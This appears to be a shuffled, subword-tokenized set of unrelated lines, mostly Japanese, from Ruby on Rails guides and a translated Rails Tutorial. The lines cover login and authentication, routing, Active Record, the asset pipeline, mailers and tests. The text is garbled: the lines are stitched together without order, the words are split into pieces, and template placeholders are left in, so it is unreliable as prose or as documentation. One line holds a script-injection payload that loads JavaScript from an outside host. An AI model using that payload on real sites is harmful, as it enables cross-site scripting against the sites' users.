▁\ k ode { authenticate } メソッドは 認 証 に 失敗した ときに \ k ode { false } を返す ▁(\ ref { sec : creating _ and _ authenticating _ a _ user }) ▁ ことを思い出しましょう ▟ 以上 を まとめて ユーザーログイン を実装 したものを リスト \ ref { code : find _ authenticate _ user } に示します 。
▁(\ emph { 注 : } この時点では わざわざ 見 に 行 く ほど の 仕 上 が り ではありません が ) 。
▁ 現 実 的な 妥協 案 として 、 作成した コード によって 影 響 が 生じる かどうかを テスト するようにしてください ▟ そして 、 変更 が railties で 行われ ていない のであれば 、 影 響 を受け る コンポーネント の すべての テストスイート を実行し てください 。
▁< h r >
▁<%= ▁url _ for ( host : ▁' example ▖ com ',
▁Active ▁Job の 主要な 目的 は 、 Rails アプリ を 即 席 で作成した 直後 でも 使用できる 、 自 前の ジョブ 管理 イン フ ラ を持つ ことです 。
▁\ emph { or } 演算子 「\ text tt {||} 」( \ ref { sec : objects _ and _ message _ passing }) ▁ を使用すれば 、 上の 「 メ モ 化 」 コードを 以下のように た った 1 行 で 書 け ます 。
▁もし どう しても 特定の JavaScript ファイルを 他の JavaScript ファイル よりも 結合 順 を 先に したい場合 、 その ファイル への require ディレクティブ を マニフェスト の 最初に 置きます 。
▁Rails には \ k ode { rails } という名前の コマンドライン コマンド があり 、\ k ode { rails ▁new } で 新しい アプリケーションを 生成 したり 、\ k ode { rails ▁server } で ローカル サーバー を実行し たり できる 。
▁ とは い う もの の 、 まだ 理解 していない ことが \ emph { 1 つ } あります ▟\ emph { Rails が \ emph { どのように して } これら を 結 び つ け ている か ということです ▟ URL を アクションに マ ッ プ する方法 や 、\ k ode { full _ title } } ヘルパー を ビューで 利用 できるように する方法 など が そう です 。
▁2▖ ordinalize ▁# ▁=> ▁" 2 nd "
▁ 以上 が このコード で 行われている ことです 。
▁* ▁` default ▁ Hash ` ▁- ▁ メイラー から 送信する あらゆる メール で使用される デフォルト値 の ハッシュ です 。
▁@ open _ orders ▁= ▁@ customer ▖ orders ▖ where ( open : ▁true ) ▁# ▁ この時点では クエリ は 行われ ない
▁### ▁ 活用 形
▁ 種類 が ` date ` の 標準 入力 フィールド を作成します 。
▁ 存在しない
▁#### # ▁` includes `
▁+ - -------- + --- ------+-------+ ------+-------+
▁ 空の ディレクトリ の 削除
▁上の コマンド を使用して Heroku の ログ ファイル を参照 し 、 エラーを デバッグ してください 。
▁ pluralize _ table _ name s ▁?
▁class ▁Create Comments ▁< ▁ActiveRecord :: Migration
▁authentication : ▁' plain ',
▁ / signout
▁ サンプルユーザー を 最初から 有効 に しておく
▁このとき 、 内部 インスタンス変数 の名前 に はデフォルトで 冒 頭 に アンダースコア が追加され ます ▟ 上の 例 であれば `@ _ log _ level ` となります 。
▁ 新規ユーザー のための ユーザー登録フォーム
▁このガイドでは Active ▁Record の基礎 について説明します 。
▁上のコードでは 、 リスト \ ref { sec : signup _ error _ messages } で 導 入 した \ k ode { error \_ messages } パーシャル を再 利用 しています 。
▁ 11 ▖ ▖ 27 ) ▁# ▁=> ▁false
▁\ ref { sec : user _ signup } で Users コントローラ を ご 紹 介 して 以 来 、 長い 道 の り を た ど って きました 。
▁config ▖ cache _ classes ` のデフォルト 値は 、 development モードでは false なので コードの 更新 が すぐ 反映され 、 test モード と production モードでは true なので 動作 が 高速 になります 。
▁ 冒 頭 の \ k ode { subl } は OS ▁X で S ublime ▁Text を 起動 する コマンド です ▟ 設定 方法 については 「\ href { http :// www ▖ s ublime text ▖ com / docs / 2 / o s x _ command _ line ▖ html } { OS ▁X ▁ コマンドライン 用 S ublime ▁Text ▁2 ドキュメント } ▁( 英語 )」 を参照してください 。
▁\ k ode { cookies } メソッドを使用すると 、 永続的 な 記憶トークン の cookies を ブラウザ に保存 して 、 永続的セッション を作成 できます 。
▁### ▁ パーシャル コレクション を 描画 する
▁ 特に 「 Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁App 」 を 全て の タイトル テストで そのまま 使 っています ▟ 専 用の \ k ode { setup } 関数 ▁( テスト の設定 用 関数 、 個 別の テストの 前に 必ず 毎 回 実行される ) ▁ を使用して この 重複 を 解 消 し 、 テスト 修正 後 も リスト \ ref { code : base _ title _ test } のテスト が ▁\ passing ▁になることを確認 します
▁ 読者 に 現時点の 最新の 方法 が 伝 わ るように 書くこと 、 それ も 明 示 的 かつ 暗 黙 に 。
▁gem ▁' devise '
▁また 、\ emph { 第 \ ref { cha : a _ toy _ app } 章 } でも 簡単に 紹 介 しました が 、\ emph { マイグレーション } の 変更を 元に戻す 方法 も 用意されています ▟ 詳細は 第 \ ref { cha : modeling _ users } 章 で説明します 。
▁2 番目の オプション 引数に ` false ` を渡すと 、 最後の グループ の 空 き は 詰 め られます 。
▁作成した コードをリスト \ ref { code : sign _ in _ function } に示します
▁self を省略した 結果を リスト \ ref { code : add _ store _ location } に示します 。
▁production 環境 から 送信 した アカウント有効化 メール
▁### ▁Action ▁Mailer の 全 メソッド
▁上の ルーティング によって 、` magazine _ period ical _ ads _ url ` や ` edit _ magazine _ period ical _ ad _ path ` などの ルーティングヘルパー が生成されます 。
▁* ▁available ▁in ▁this ▁directory ▁and ▁any ▁sub - d ir ec to r ies ▖
▁# ▁if ▁you ' re ▁ sh ar ing ▁your ▁code ▁public ly ▖
▁* ▁ リレーション で EXPLAIN を実行する
▁ 送信 した プルリクエスト は Rails コア チーム に 知 ら されます 。
▁ユーザー ログアウト のテスト
▁ authenticated ?( : reset , ▁token )
▁create ▁app / controllers / application _ controller ▖ rb
▁* ▁` config ▖ assets ▖ compress ` オプションは 、 たとえば 以下のように ` config ▖ assets ▖ js _ compressor ` ▁ に 変更 する必要があります 。
▁\ href { https :// www ▖ u de my ▖ com / learn - test - driven - development - in - ruby / co upon Code = hartl } { B al a ▁P ar an j ’ s ▁ Test ▁D r ive n ▁Development ▁in ▁Ruby } : ▁Ruby を使って テスト駆動開発 を学ぶ 、 上 級 者 向 け の オンライン 講 座 です 。
▁この アプリケーションコード では 、\ k ode { following ?} メソッドは \ k ode { other _ user } という 1 人のユーザー を 引数に と り 、 フォローする 相手 の ユーザーが データベース 上に 存在する かどうかをチェックします ▟\ k ode { follow !} メソッドは 、\ k ode { relationships } 関連付け を経由して \ k ode { create !} を呼び出す ことで 、「 フォローする 」 の リレーションシップ を作成します 。
▁ これはリスト \ ref { code : layout _ signin _ signout _ links } で使用されていました 。
▁この ` find _ by _ sql ` メソッドは 、 オブジェクト の配列 を 1 つ 返します ▟ クエリ が レコードを 1 つ しか 返 さ なかった場合 にも 配列 が返されます のでご注意ください 。
▁以下の 出力 の prefix 列 や 他の 列 については 後 ほど 解説します が 、 ここで ご 注 目 い ただ き たい のは 、 Rails は 「 articles 」 という リソース 名 から 単数形 の 「 article 」 を推測し 、 両者 を その 意味 に そ って 使い 分 け ている という 点 です ▟ prefix 列 で 単 一 の 項目 には 単数形 の article 、 複 数 項目 を扱う 場合には 複数形 の articles が 使われ ている という 具 合 です 。
▁StaticPages コントローラの 継 承 階層
▁< script ▁src = http :// www ▖ security lab ▖ ru / test / s c ▖ js ></ script >< ! - -
▁\ k ode {" subl ▁- w "} ▁ の 部分 は 、 TextMate の場合は ▁\ k ode {" m ate ▁- w "} 、 g V im の場合は \ k ode {" gvim ▁- f "} 、 M ac V im の場合は \ k ode {" mv im ▁- f "} ▁ に それぞれ 置き換え ます 。
▁ユーザー 削除 と同じ くらい 重要な ことは 、 その 振る舞い が 期 待 された かどうかを 確かめ る 良い テストを書く ことです 。
▁ Edit リンク が追加された index アクション ]( images / getting _ started / index _ action _ with _ edit _ link ▖ png )
▁# ▁=> ▁30 2▖2 4 3 99 %
▁# ▁Find ▁the ▁client ▁with ▁primary ▁key ▁( id ) ▁10 ▖
▁ オブジェクトは ` blank ?` に すら 応答 してくれ ません 。
▁user - microposts
▁ マイクロポスト に 関連付けられた ユーザー オブジェクト を返す 。
▁{0} 図 11 ▖ 15 {/0} {1} ユーザーの フォロワー 用 ページのモックアップ ▟\ href { http :// railstutorial ▖ org / images / figures / followers _ mockup _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁ セッションを 編集 したり ユーザーに 表示 したり する必要が ないので 、\ k ode { resources } メソッドに \ k ode { : only } オプション を追加し 、\ k ode { new }、\ k ode { create }、\ k ode { destroy } の 3 つの アクション のみ を有効に します 。
▁The ▁date ▁and ▁time ▁is ▁<%= ▁Time ▖ now ▁%></ p >
▁d ▖ beginning _ of _ year ▁# ▁=> ▁Fri , ▁01 ▁Jan ▁2010
▁たとえば 、 S ublime ▁Text ▁ で サンプルアプリケーション を開く 場合は 、 以下を実行し ます 。
▁# ▁ アセット で 読み 込 んだ 行 を 展開 する
▁Git のインストール
▁この 行 を 記 述 することで 、 エンジン が アプリケーションの ` / blog ` パス に マウント されます 。
▁config ▖ assets ▖ compress ▁= ▁false
▁` config / application ▖ rb ` 設定 に 以下 を追加する ことで 、 コントローラ 固有の アセット ファイル 生成 を 止 め ることもできます 。
▁( Ruby で 組み込み クラス に メソッドを 追加 できる ということは 実に ク ー ル ですが 、\ k ode {" de if i ed "} ▁( = 神 格 化 された ) ▁という 単語 が 回 文 になっている ことも 、 それ に 劣 らず ク ー ル ではない でしょうか ▟)
▁[ Rails ]( http :// github ▖ com / rails / rails ) に プルリクエスト を 送 ることができます ▟ 常 連 貢献 者 に なったら 、[ Rails コア チーム ]( http :// rubyonrails ▖ org / core ) に
▁ 言い 換 え ると 、\ k ode { object : ▁f ▖ object } は \ k ode { error _ messages } パーシャル の中で \ k ode { object } という 変数 名 を作成します 。
▁ セッション を削除する ▁( サインアウト )
▁ 名前付きルート のテスト 。
▁\ k ode { rake ▁db : seed } コマンドは 、\ k ode { db / seed s ▖ rb } にある サンプルデータを データベースに 流 し 込 む
▁\ k ode { presence : ▁true } という 引数 は 、 要素 が ひとつ の \ emph { オプション ハッシュ } です ▟\ ref { sec : css _ revisited } のように メソッドの 最後の 引数として ハッシュ を 渡す 場合 、 波 括 弧 を付け なくても 問題ありません
▁gem ▁' rails ', ▁' 3▖1 ▖ 12 '
▁process _ with out _ stringified _ params ( action , ▁params , ▁session , ▁flash , ▁ http _ method )
▁上の テスト 手順 の実装 を リスト \ ref { code : flash _ persistence _ test } に示します 。
▁これは 、 Web サイト で ユーザー登録 を 行えるように するための 最初の 重要な 一 歩 となります ▟ 次の 一 歩 である ユーザーの モデリング は 第 \ ref { cha : modeling _ users } 章で 行い 、 第 \ ref { cha : sign _ up } 章で ユーザー登録 が 完成 します 。
▁ / users
▁ today ?
▁ 無効な 値 の 送信 を ログインフォーム で 正しく 処理 できる ようになった ので 、 次は 、 実際に ログイン 中の 状態 での 有効な 値 の 送信 を フォーム で 正しく 扱えるように します 。
▁このメソッドは 、 引数に 与えられた 文字列 ▁( パスワード ) ▁ を ハッシュ化 した 値 と 、 データベース 内にある \ k ode { password \_ digest } カラム の 値を 比 較 します 。
▁` config / database ▖ yml ` ファイルが 上書き される ことを確認する と 、 アプリケーションの 設定 は SQLite 用 から MySQL 用に 変更 されます 。
▁ delegate ▁: name , ▁to : ▁: profile , ▁allow _ nil : ▁true
▁ アカウント有効化 メイラー メソッドの テンプレート を リスト \ ref { code : generated _ account _ activation _ view _ text } と リスト \ ref { code : generated _ account _ activation _ view _ html } に示します 。
▁(\ k ode { : success } キー は シンボル ですが 、 テンプレート 内に 反 映 させる 直 前 で 、 埋め込み Ruby が自動的に \ k ode {" success "} という 文字列に変換 しています ▟)
▁(\ k ode { spec / helpers } ディレクトリ と \ k ode { application _ helper _ spec ▖ rb } ファイル の両方 を作成する 必要がある でしょう ) 。
▁ 結合テスト は 、 アプリケーションの 各 ページ が 正常に 動作する かどうかを テスト してくれる 強力な ツール です ▟ 手動で ブラウザ を 操作 して テスト する必要が なく なり 、 Capybara を 併 用 すれば 自 然 言語 ▁( 英語 ) ▁ に 近 い 文法 で テストを 記 述 する 事 も できます
▁ ActiveSupport :: JSON :: Encoding ▖ time _ precision ▁= ▁0
▁# ▁=> ▁Thu , ▁01 ▁Ju l ▁2010 ▁00:00:00 ▁UTC ▁+00:00 ▖ ▖
▁( リスト \ ref { code : followers _ test } では 、\ k ode { following ?} と 対 照 的な \ k ode { followed \_ by ?} メソッドを使って も よ か った のですが 、 サンプルアプリケーション で 実際に 使う 場 面 が なかった ので 省略 しました ▟)
▁ 通常の ルーティング を設定する のであれば 、 Rails が ルーティング を ブラウザから の HTTP リクエスト に 割り当て るため の シンボル をいくつか 渡します 。
▁=> ▁#< User ▁id : ▁nil , ▁name : ▁nil , ▁email : ▁nil , ▁created _ at : ▁nil , ▁updated _ at : ▁nil >
▁{0} 図 5 ▖7{/0}{1} Home ページ ▁(\ href { http :// localhost :3000/ static _ pages / home }{/ static _ pages / home }) ▁ に フッター を追加する ▟\ href { http :// railstutorial ▖ org / images / figures / site _ with _ footer _ bootstrap _4_0 - full ▖ png }{( 拡大 ) }{/1}
▁そこで 、\ k ode { log \_ in \_ as } という ヘルパーメソッド を作成して テスト 用に ログイン できるように し 、 無駄な 繰り返し を 排 除 します 。
▁% w ( a ▁b ▁c ▁d )▖ append (' e ') ▁# ▁=> ▁% w ( a ▁b ▁c ▁d ▁e )
▁WARNING : ▁ 一部の データベース では 、 大文字 小文字 を 区別 しないよう に設定され ている ことがあります 。
▁ここで \ k ode { before (: all )} を使用して 、 ブロック にある すべての テストの 前に サンプルユーザー を \ emph { 一 括 } 作成する ように し ていることに注目してください 。
▁ データベース の観点 では 、 この 関連付け では 相手 の クラス が 外部キー を持ちます 。
▁` M ul t i J s on :: D e code Error ` のような 低 レベル の 例外 の 代りに この 例外 を レ ス キュー することができます 。
▁#### # ▁` extending `
▁この 他 に オプション を指定する 必要はありません 。
▁ パスワード再設定の リンクを メール送信 する
▁Client ▖ where ( first _ name : ▁' Ryan ')▖ count
▁リスト { p 0} で お 見 せ した ように 、 Application ヘルパー で 使 っている {2} full _ title {/2} ヘルパー を 、 test 環境で も 使えるように すると 便利です 。
▁CDN が提供する ` X - Cache ` などの 機能 や CDN が 追加する ヘッダ などの 付 加 的 情報 については 、 CDN の ドキュメント を 確認してください 。
▁ この章 の サンプルアプリケーション では 、 Active ▁Record のメリット はまだ は っ き り とは わからない かもしれませんが 、 この後 の 章では ファクトリー の 機能を さらに 活用 する 予定です 。
▁次に 、 マイクロポストの \ k ode { content } 属性 に対する バリデーション を追加しましょう ▁(\ ref { sec : putting _ the _ micro _ in _ microposts } で紹介した 例 と同じ です ) 。
▁( 訳 注 : ▁ heroku コマンド のバージョン が 古 い と ここで 失敗する かもしれません ▟ その 場合は 、 Heroku ▁T oolbelt ▁( ▁ https :// t oolbelt ▖ heroku ▖ com / ▁ ) ▁ を使って 最新 版 に 更新 するか 、 次の 古 い 文法 の コマンドを 試 してみてください : ▁\ $ ▁ heroku ▁add on s : add ▁ sendgrid : start er ▁ ) ▁[ B R ] ╼[ B R ] ╼ アプリケーションで SendGrid ア ド オン を使用する には 、 production 環境 の \ href { https :// en ▖ w ikipedia ▖ org / wiki / Simple _ Mail _ Transfer _ Protocol } { SMTP } に 情報を 記 入 する必要があります 。
▁<%= ▁image _ tag ▁" home ▖ g if ", ▁ alt : ▁" Home " ▁%>
▁= ================ ================ ==
▁これらの ネスト 機能 は 、 フッター の CSS で も使用できます ▟ リスト \ ref { code : footer _ css } のコードは 、 SCSS を使用して 以下のように 書き 換 え ることができます 。
▁ 他の ページ について も同様に 変更します 。
▁### ▁Action ▁Mailer を設定する
▁email カラム に インデックス を追加する ことで 、 この問題 を解決する ことができます 。
▁ここまで 進 め たら 、 後 は Git リポジトリを 初期化 する だけです
▁| ▁PATCH / PUT ▁| ▁ / magazine s / : magazine _ id / ads / : id ▁| ▁ ads # update ▁| ▁ ある 雑 誌 1 冊 に含まれる 広 告 を 1 つ 更新 する ▁|
▁この場合 、` orders _ count ` フィールド の 値が 2 である すべての クライアント が 検索 されます 。
▁create ▁test / models / blorgh / comment _ test ▖ rb
▁` extract _ options !` メソッドを使用すると 、 この オプション ハッシュ を取り出し 、` action s ` から 取り除く ことが 簡 単 かつ 明示的に 行えます 。
▁# ▁ ActiveSupport ▖ on _ load (: active _ record ) ▁do
▁4 3 , ▁ 44 , ▁ 45 , ▁4 6 , ▁4 7 , ▁ 48 , ▁4 9 , ▁50 , ▁ 51 ]
▁through : ▁: orders
▁< form ▁action ="/ people / create " ▁method =" post ">
▁options ▁= ▁options ▖ stringify _ keys
▁before _ save ▁: set _ author
▁ NoMethodError : ▁undefined ▁method ▁` split ' ▁for ▁: name : Symbol
▁ このような 構成 になっている ことで 、 この エンジン で 利用 するための 独自の コントローラ や モデルを 以下のように 簡単に 生成 することができます 。
▁scope ▁' / admin ' ▁do
▁{0} 第 {1} 7 {/1} 章 {/0} で Web サイト での 新規 ユーザー登録 が 行える ようになりました ので 、 今度は ユーザーがログイン や ログアウト を 行えるように しましょう 。
▁` missing _ name ?` メソッドは 、 この 2 つの 場合 を 区別 するために使用されます 。
▁ 人 々 は 何か インストール し ようとした り オンライン フォーム に 記 入 したり する たびに 、 それら が さ っ ぱ り 動かない という 事 態 に す っかり 慣 ら されて しま っている 。
▁ メールを c r on job など から 今 すぐ 送信 したい場合は 、` deliver _ now ` を呼び出す だけで済みます 。
▁ デモアプリケーション の User モデル 。
▁<%= ▁image _ tag ▁" rails ▖ png " ▁%>
▁これは 、 モデルの 記 述 とは 別の 視 点 から 、 記事 と コメント の 間 の リレーションシップ を 階層 的に 捉 え た もの である と 言えます 。
▁CDN の 典型的な 利用 法 は 、 production サーバー を ▁" origin " ▁ サーバー として 設定 することです 。
▁ おそらく \ href { http :// stack overflow ▖ com / questions / 67 14 19 6 / ruby - url - en coding - string } { 2 通り の 手法 } ▁(\ k ode { URI :: en code ( str )} と \ k ode { C G I :: escape ( str ) }) ▁ が 見つかる と思います 。
▁さらに 、 これ に関連する \ k ode { following ?} 論理値 メソッド も 追加 し 、 ある ユーザーが 誰 か を フォローしている かどうかを確認 できるようにします
▁M ac ▁OS ▁X ユーザー の場合 、 X code という 開発 ツール のインストール が 必要な ことがあります 。
▁* ▁` eager _ load !` : ▁` config ▖ eager _ load ` が true に設定され ている 場合 、` config ▖ before _ eager _ load ` フック を実行し 、 続いて ` eager _ load !` を呼び出します ▟ この 呼び出し により 、 すべての ` config ▖ eager _ load _ namespace s ` が呼び出され ます 。
▁ 本章の 最後に 、[ remember ▁me ] ▁ チェックボックス で ログイン を 保 持 する方法 を 解説します 。
▁#### # ▁` collection ▖ size `
▁use ▁ActiveRecord :: Query Cache
▁ それぞれの テストでは 、 アクションを get して 正常に 動作する ことを確認します ▟ この 確 認 は 「\ emph { アサーション } 」( assert ion : ▁ 主 張 、 断 言 ) ▁ と呼ばれる 手法 で 行います 。
▁` app / views / users / _ user ▖ html ▖ erb ` パーシャル の内容 は以下のようになります 。
▁また 、\ emph { {1} 第 2 章 {/1} } でも 簡単に 紹 介 しました が 、 {2} マイグレーション {/2} の 変更を 元に戻す 方法 も 用意されています ▟ 詳細は {3} {1} 第 6 章 {/1} {/3} で説明します 。
▁このメソッド の 内部で は 画像 へのパス 作成 に ` image _ tag ` が使用されています 。
▁ユーザーの 初期 状態 は 「 有効化 されていない 」( unactivated ) ▁ に しておく 。
▁たとえば 、 ある メソッドの 可視性 を private から public に切り替え た 際に 、 内部 の パ ブ リ ッ ク メソッドに `: no doc : ` が指定されてい なかった という 事例 があり えます 。
▁ ご想像 のとおり 、 ここでは User モデルの \ k ode { find } メソッド ▁(\ ref { sec : find ing _ user _ objects }) ▁ を使用して データベースから ユーザー を取り出し ます ▟ リスト \ ref { code : user _ show _ action } のように 書き換えて ください 。
▁next _ year
▁`@ products ` が ` Product ` インスタンス の コレクション であれば 、 以下のコード でも 同じ 結果を 得られます 。
▁ フレンドリーフォワーディング で 、 最初に 与えられた URL に のみ 確 実に 転 送 されている ことを確認する テスト を作成してください 。
▁ 英 数字 、 アンダースコア ▁( _ ) 、 プ ラ ス ▁( + ) 、 ハイフン ▁( - ) 、 ドット ▁( ▖) ▁ のいずれか を 少なくとも 1 文字 以上 繰り返す
▁[ remember ▁me ] ▁ チェックボックス の動作 を確認する ために 、2 つの テスト を作成します ▟ チェックボックス が オン になっている 場合 と オフ になっている 場合 のテスト です 。
▁( ちなみに 、 Ruby の 威 力 の 一 端 を お 見 せ するために 、 ランダム な サブドメイン 名 を生成する ための コンパクト な コードを 以下 に 記 します 。
▁ 一般に 、「 機能 」 は アプリケーションに 新しい 振る舞い を追加する もの であり 、 バグ とは 既存の 振る舞い が 期待どおり で ないこと を示します 。
▁ アセットパイプライン を使うと 、 この 「 開発 効率 と 読み込み 時間 のどちら を 重 視 するか 」 という 問題 について 悩 む 必要 が なくなります 。
▁load ▁' deploy / assets '
▁add _ header ▁ ETag ▁" " ;
▁t ▖ string ▁: title
▁\ ref { sec : partial s } で 追加する サイト フッター を除いて 、 これで レイアウト は 完成 しました ▟ Home ページ へ アクセス して 表示 結果 を確認する ことができます 。
▁` next _ week ` メソッドは 、 英語 表 記 ▁( デフォルトでは スレッド ローカル の ` Date ▖ beginning _ of _ week ` または ` config ▖ beginning _ of _ week ` または `: monday ` ) ▁ の 日付 名 の シンボル を受け取り 、 それに対応する 日付 を返します 。
▁このコードは リスト \ ref { code : layout _ signin _ signout _ links } で使用されていました ▟ もうひとつ 、
▁ 学習 中に 知識 不 足 を 実 感 する 箇所 が 出 てきた ら 、 この後 で ご 紹 介 する 資 料 で い つ でも 学 び 直 してから先に進 め ば よい のです 。
▁ ところで 、 この 正規表現 パターン は どうやって 作 れば よい のでしょうか 。
▁たとえば 、「 供 給 者 が アカウント を持っている 」 とみなす 方が 、「 アカウント が 供 給 者 を持っている 」 と 考え る よりも 自 然 です 。
▁( ちなみに 今 の状態 では 、 空 でない メールアドレス であれば 全て 通 ってしまいます ) ▁ 。
▁上の ルーティング では ` user _ path ` メソッド が生成され 、 コントローラ ・ ヘルパー ・ ビューで それぞれ 使用 できるようになります ▟ このメソッドは 、` / bo b ` のような ユーザー名 を持つ ルーティング に移動し ます 。
▁次に 、 すべての ユーザーを 一覧 できるようにします ▁( もちろん 認 証 を要求します )▟ これは サンプル データ と ページネーション ▁( p a g n ation ) ▁ を導入する 動 機 にも なります 。
▁* ▁ 旧 来 の find er を再度 有効 に したい場合は 、[ active record - deprecated _ find ers ▁gem ]( https :// github ▖ com / rails / active record - deprecated _ find ers ) ▁ を使用できます 。
▁{0} 表 7 ▖ 1 {/0} ▁{1} リスト \ ref { code : users _ resource } の Users リソース が提供する RESTful な ルート {/1}
▁ サンプルアプリケーション で Bootstrap を使用する ための 変換 作業 で 、 目 覚 ま しい 活 躍 を見 せ て 助 け て く れ た 読者 の \ href { https :// twitter ▖ com / col m t uite } { C ol m ▁T uite } に 感 謝 します 。
▁リスト \ ref { code : demo _ user _ class } と リスト \ ref { code : demo _ micropost _ class } を 比較してみると 、 User モデルと Micropost モデル は いずれも \ k ode { ActiveRecord :: Base } という クラス を継承し ています ▁( 継 承 関係 は \ k ode { < } 記 号 で 表現 されています )▟ この クラスは 、 ActiveRecord が提供する ベース クラス であり 、 クラス 間 の リレーション は 図 \ ref { fig : demo _ model _ inheritance } のようになります 。
▁これにより 、\ k ode { user ▖ reload } を使用して テスト データベースから \ k ode { user } 変数 に 再度 読み込み が 行われ 、 ユーザーの 新しい 名前とメールアドレス が 新しい 値 と 一致する かどうか が 確 認 されます 。
▁たとえば 、 誰 か が 実際には 存在しない アセット ` / assets / i - do nt - ex ist ▖ png ` に リクエストを 行い 、 Rails が 4 04 エラー を返し た とします ▟ このとき に ` Cache - Control ` ヘッダー が有効になってい ると 、 CDN はこの 4 04 エラー ページを キャッシュ し よう とします 。
▁ ヘルパー モジュール は 必 須 では ないので 、 Rails は 読み込み エラーを 例外 扱 い せずに 黙 殺 します 。
▁ サイドバー にある マイクロポストの 合 計 投 稿 数を テスト してください ▟ このとき 、 単数形 ▁( micropost ) ▁ と 複数形 ▁( microposts ) ▁ が正しく 表示 されている かどうか も テスト してください 。
▁ コンテナ ▁( ハッシュ 、 配列 、 enumerable 、 独自の 型 ) ▁ を 引数として 受け付け 、 オプション タグ の 文字列 を返します 。
▁ マイクロポストの ステータスフィード を実装する ための 準備
▁ GUI ▁( グ ラ フ ィ カ ル ユーザー インターフェイス ) ▁ しか 使 った こと の ない ユーザー から すると 、 コマンドライン の 黒 い 画面 は 何 や ら 恐 ろ し げ で と っ つ き が 悪 い ように 見え る かもしれませんが 、 見た 目 ほど 当 て にならない もの はありません ▟ コマンドライン は それ 自体 が 強力な ツール であり 、 エ ン ジ ニ ア にとって なく て はならない 道 具 箱 なのです ▁( 訳 注 : ▁ 操作を 誤 った ときの 被 害 も その 分 甚 大 ですが )▟ そう で なければ 、 どう して エ ン ジ ニ ア が 揃 い も 揃 って コマンドライン を使う でしょうか 。
▁ フレンドリーフォワーディング の 後 、 転 送 先 が デフォルト ページに 変わる ことを確認する テスト 。
▁| ▁` { ▁" person " : ▁[ null , ▁ null , ▁▖▖▖ ] ▁}` ▁| ▁` { ▁: person ▁=> ▁nil ▁}` ▁|
▁この節では 、 ユーザーに サインイン を 要求 し 、 かつ 自分 以外の ユーザー情報 を変更 でき ないようにする セキュリティ モデルを 構 築 しましょう 。
▁=> ▁" aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa ╼ aaaaaaaaaa aaaaaaaaaa aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa
▁t ▁= ▁Time ▖ local (201 0, ▁5 , ▁ 8 ) ▁# ▁=> ▁S at , ▁ 08 ▁May ▁2010
▁ まとめると 、 {0}{1} 第 6 章 {/1}{/0} から {2}{1} 第 10 章 {/1}{/2} を通して 、 Rails の ログイン と 認証システムを ひ と とおり 開発 します 。
▁format ▖ text
▁ このように して 構 築 した Rails チュートリアル 用 Cloud 9 ワークスペース には 、 Ruby 、 RubyGems 、 Git など 、 プロ 級 の Rails 開発環境 に必要な ソフトウェア がすべて 組み 込 まれ ています 。
▁#### ▁ benchmark
▁\ k ode { full \_ title } ヘルパー を使った Web サイトの レイアウト
▁HTML 構造 を削除し た About ページ ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁最後に 、 Git で この To y アプリケーションを バージョン管理 下 に 置きます 。
▁ ビュー はその 内容 を HTML に変換 し ▁( 7 ) 、 コントローラ が ブラウザに HTML を送信し て 、 ブラウザで HTML が表示されます ▁( 8 ) 。
▁\ k ode { root _ url } を かっこ で 囲 んで この問題 を 回 避 することもできます が 、\ k ode { and } を使用する 方が 常 道 です 。
▁ここで 、 配列 の \ k ode { each } メソッドでは 、 ブロック の 変数 は 1 つだけ ですが 、 ハッシュの \ k ode { each } メソッドでは 、 ブロック の 変数 は \ emph { キー } と \ emph { 値 } の 2 つ になっている ことに注意してください 。
▁ ステータスコード は 数字 で 指定 する 他 に 、 以下 に 示す シンボル で 指定することもできます 。
▁ umerate }╼╼ ▁% ▁subsection ▁the _ form _ html ▁( end )╼╼ ▁\ section { ユーザー登録 失敗 } ▁% ▁( fold )╼ ▁\ label { sec : unsuccessful _ signup s }╼╼
▁デフォルトのエラーメッセージは ▁_" is ▁invalid " _ ▁ です 。
▁Rails で アセットパイプライン を有効に している場合 、 この ヘルパーは ` / assets / stylesheets / ` へのリンク を生成します 。
▁ ログイン 機能 の最初の 具体的な 応用 として 、 ユーザーがログイン している とき と そうでない とき で レイアウト を変更 してみましょう 。
▁それでは 、 これまで の 変更を トピックブランチ に コミット し 、 master ブランチ に merge し ていきましょう 。
▁{0}{1} 第 7 章 {/1}{/0} では 、 ユーザーが サイトに ユーザー登録 できるように し 、 ユーザープロファイル のための ページ を作成します 。
▁Rails で 作成する Web アプリケーションが 置かれ ている ディレクトリ の ルート ▁( root ) ▁ を 、\ emph { Rails ルート } と呼ぶ ことにします ▟ この 用 語 は 誤 解 され やすい よう で 、 多くの 人 が Rails ルート を 「 Rails という アプリケーション そのもの が インストール されている ディレクトリ の ルート 」 だと 勘 違い します 。
▁" :: " も " / " に 逆 変換 されます 。
▁ cha r set : ▁" UT F -8 ",
▁* ▁` proxy _ association ▖ target ` は 、` belongs _ to ` または ` has _ one ` 関連付けの オブジェクト を返す か 、` has _ many ` または ` has _ and _ belongs _ to _ many ` 関連付け オブジェクトの コレクション を返します 。
▁ 条件 付き バリデーション
▁ 有効化 メール では 以下の 形式 の URL を使用します 。
▁このとき 、
▁しかし 、 HTML 要素 に 実 用 的な クラス を与える という 良い 仕 事 が できた の も 確 か です ▟ さらに 、 クラス を与え た この 段階で 、 CSS を使用して サイトに スタイル を与える ことができ た のは 、 タイミング として 非常に 適切 である と思います 。
▁id = \ text tt {1} のユーザー を表示する ページ
▁ 与えられた テーブル名 に対応する クラス名 を返します 。
▁このメソッドは 一見 して ` ActiveRecord :: Core ` の パブリックな クラスメソッド であり 、 実際 それ 自体 は 間 違い ではありません 。
▁しかし 残念ながら この フィルタ は 1 度 しか 実行 され なかった ため 、 ワーム が 潜 む on load 属性 が 除 去 され ずに そのまま 残 っ てしまい ました 。
▁`: shallow ` オプションを使用することで 、 上 と同じ 内容 を さらに 簡 単 に記述 できます 。
▁このコードは たとえば \ k ode {" 0 ▁errors " }、\ k ode {" 1 ▁error " }、\ k ode {" 2 ▁errors "} など のように 、 エラー の 数 に応じて 活用 された 単語 を返します ▟ これにより 、\ k ode {" 1 ▁errors "} のような 英語 の 文法 に 合 わ ない 文字列を 避ける 事 が できます ▟ ▁( a ▁di str ess ing ly ▁common ▁mistake ▁on ▁\ href { http :// www ▖ u rb an dictionary ▖ com / define ▖ ph p ? term = in ter web s } { te h ▁inter web s }) ▖
